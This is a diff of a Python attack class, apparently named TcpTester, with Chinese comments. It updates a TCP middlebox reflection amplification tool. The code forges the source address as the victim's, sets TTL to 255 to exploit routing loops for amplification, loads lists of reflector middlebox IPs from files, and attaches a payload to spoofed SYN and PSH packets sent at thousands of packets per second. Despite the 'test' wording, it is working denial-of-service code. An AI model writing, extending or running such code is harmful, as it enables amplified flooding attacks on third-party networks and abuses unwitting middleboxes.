@@ -81,8 +81,11 @@ class TcpTester:
         # TCP 攻击特有配置
         self.tcp_pkt_methods = ["PSH", "PSH_ACK"]  # 默认发包方式
         self.sensitive_payload = DEFAULT_PAYLOAD
-        self.ttl = 64
+        self.ttl = 255  # 论文推荐TTL=255利用路由环路放大
         self.seq = 1000  # 固定序列号
+
+        # IP 来源追踪（日志输出用）
+        self._last_source_description: str = ""
 
     def run_test(
         self,
@@ -96,8 +99,14 @@ class TcpTester:
         target_pps: int = 5000,
         stats_callback: Optional[Callable[[Dict], None]] = None,
         tcp_pkt_methods: Optional[List[str]] = None,
+        ttl: int = 255,
+        source_files: Optional[List[str]] = None,
     ) -> None:
         """运行 TCP 中间盒攻击测试"""
+        # 设置 TTL（论文推荐 255，利用路由环路放大）
+        if isinstance(ttl, int) and 1 <= ttl <= 255:
+            self.ttl = ttl
+
         # 设置伪造源IP/端口
         if not spoof_source_ip:
             spoof_source_ip = target_ip
@@ -129,15 +138,15 @@ class TcpTester:
             self.test_stats['max_amplification_factor'] = 0.0
 
         try:
-            # 加载 TCP 中间盒 IP 列表
-            servers = self._load_servers()
+            # 加载 TCP 中间盒 IP 列表（支持按 source_files 限定来源，默认优先优质池）
+            servers = self._load_servers(source_files=source_files)
             if not servers:
                 logger.error("没有可用的TCP中间盒IP")
                 if self.stats_callback:
-                    self.stats_callback({'error_message': '没有可用的TCP中间盒IP，请先运行TCP扫描获取IP列表'})
+                    self.stats_callback({'error_message': '没有可用的TCP中间盒IP，请先运行TCP扫描获取IP列表或在资源管理中选择源文件'})
                 return
 
-            logger.info(f"加载了 {len(servers)} 个TCP中间盒IP")
+            logger.info(f"加载了 {len(servers)} 个TCP中间盒IP（来源: {self._last_source_description or '优质池/全部'}）")
 
             # 优化系统设置
             self._optimize_system()
@@ -233,19 +242,93 @@ class TcpTester:
 
     # ---- 内部方法 ----
 
-    def _load_servers(self) -> List[str]:
-        """从 ip_lists/ 目录加载所有 TCP 中间盒 IP"""
-        servers = []
-        if self.servers_dir.exists():
-            for txt_file in sorted(self.servers_dir.glob("*.txt")):
-                try:
-                    with open(txt_file, 'r', encoding='utf-8') as f:
-                        for line in f:
-                            line = line.strip()
-                            if line and not line.startswith('#'):
-                                servers.append(line)
-                except Exception as e:
-                    logger.warning(f"加载IP文件 {txt_file} 失败: {e}")
+    def _load_servers(self, source_files: Optional[List[str]] = None) -> List[str]:
+        """从 ip_lists/ 目录加载 TCP 中间盒 IP，支持来源限定。
+
+        策略：
+        1) 若 source_files 非空，只从指定文件加载（允许前端或上游限定为优质池/具体文件/全部）。
+        2) 若未指定来源，则先尝试优质池文件（qualified_pool.txt / qualified_pool 目录）；
+           优质池为空或不存在时再回退到目录内全部 .txt，避免混入未验证的原始国家列表。
+        """
+        from pathlib import Path
+
+        servers: List[str] = []
+        loaded_paths: List[str] = []
+
+        if not self.servers_dir.exists():
+            logger.warning(f"TCP中间盒IP目录为空或无有效IP: {self.servers_dir}")
+            self._last_source_description = "目录不存在"
+            return servers
+
+        qualified_names = {"qualified_pool.txt"}
+
+        def _read_servers_from_file(file_path: Path) -> List[str]:
+            result: List[str] = []
+            try:
+                with open(file_path, 'r', encoding='utf-8') as f:
+                    for line in f:
+                        line = line.strip()
+                        if line and not line.startswith('#'):
+                            result.append(line)
+            except Exception as e:
+                logger.warning(f"加载IP文件 {file_path} 失败: {e}")
+            return result
+
+        # 情况 1：调用方明确指定了源文件（可能是优质池、具体文件、或"全部"对应的多文件列表）
+        if source_files:
+            for src in source_files:
+                if not src:
+                    continue
+                candidate = Path(src)
+                # 支持传绝对路径
+                if not candidate.is_absolute():
+                    # 相对路径先按 servers_dir 解析，失败再按项目根尝试
+                    candidate = self.servers_dir / candidate
+                if candidate.exists() and candidate.is_file():
+                    loaded_paths.append(str(candidate))
+                    servers.extend(_read_servers_from_file(candidate))
+                else:
+                    # 也允许传文件名（不带路径），从 servers_dir 中匹配
+                    named = self.servers_dir / str(Path(src).name)
+                    if named.exists() and named.is_file():
+                        loaded_paths.append(str(named))
+                        servers.extend(_read_servers_from_file(named))
+            self._last_source_description = f"指定来源({len(loaded_paths)}个文件)" if loaded_paths else "指定来源未找到匹配文件"
+
+        # 情况 2：未指定来源，默认优先优质池 → 回退全部
+        else:
+            # 优先尝试优质池：servers_dir 下的 qualified_pool.txt
+            qualified_candidates = [
+                self.servers_dir / "qualified_pool.txt",
+            ]
+            # 也接受 qualified_pool 目录（虽然历史上与 resources/ip_lists 是两个位置，但保持兼容尝试）
+            alt_qualified_dir = self.servers_dir.parent.parent / "qualified_pool"
+            if alt_qualified_dir.exists():
+                qualified_candidates.append(alt_qualified_dir / "qualified_pool.txt")
+
+            found_qualified = False
+            for qp in qualified_candidates:
+                if qp.exists() and qp.is_file():
+                    loaded_paths.append(str(qp))
+                    servers.extend(_read_servers_from_file(qp))
+                    found_qualified = True
+                    break
+
+            if found_qualified and servers:
+                self._last_source_description = "优质池(qualified_pool.txt)"
+            else:
+                # 优质池为空或不存在：回退加载全部 .txt（含原始国家列表）
+                all_txt_files = sorted(self.servers_dir.glob("*.txt"))
+                for txt_file in all_txt_files:
+                    try:
+                        loaded_paths.append(str(txt_file))
+                        servers.extend(_read_servers_from_file(txt_file))
+                    except Exception as e:
+                        logger.warning(f"加载IP文件 {txt_file} 失败: {e}")
+                if found_qualified and not servers:
+                    self._last_source_description = "优质池为空，已回退加载全部.txt"
+                else:
+                    self._last_source_description = "全部 .txt 文件"
 
         if not servers:
             logger.warning(f"TCP中间盒IP目录为空或无有效IP: {self.servers_dir}")
@@ -303,10 +386,10 @@ class TcpTester:
             ) / Raw(load=self.sensitive_payload)
             packets = [psh_pkt]
 
-        elif method_num == 5:  # SYN
+        elif method_num == 5:  # SYN with GET (论文方法5)
             syn_pkt = IP(src=spoof_ip, dst=ip, ttl=ttl) / TCP(
                 dport=80, sport=spoof_port, flags="S", seq=self.seq
-            )
+            ) / Raw(load=self.sensitive_payload)
             packets = [syn_pkt]
 
         return packets
